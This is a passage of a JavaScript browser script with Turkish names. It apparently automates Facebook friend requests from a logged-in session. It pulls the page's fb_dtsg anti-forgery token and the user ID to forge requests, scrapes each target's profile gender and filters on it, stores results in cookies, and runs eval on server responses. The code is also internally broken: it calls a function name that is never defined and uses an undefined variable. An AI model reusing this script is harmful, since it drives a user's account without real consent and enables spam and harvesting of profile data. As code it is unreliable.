    params += "&ego_log_data=";
    params += "&http_referer=";
    params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
    params += "&__user=" + user_id;
    xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
    xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
    
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
    xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
    cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
    xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
    var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
      if(xmlhttp.readyState == 4){
      eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
      cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
      btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
      if(cinshtml.getElementsByTagName("select")[0].value == "1"){
      document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
      }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
      document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
      }
      eval(fonksiyon + "(" + id + "," + cins + ");");
      }
        };
    xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
    xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
    xmlhttp.send();
}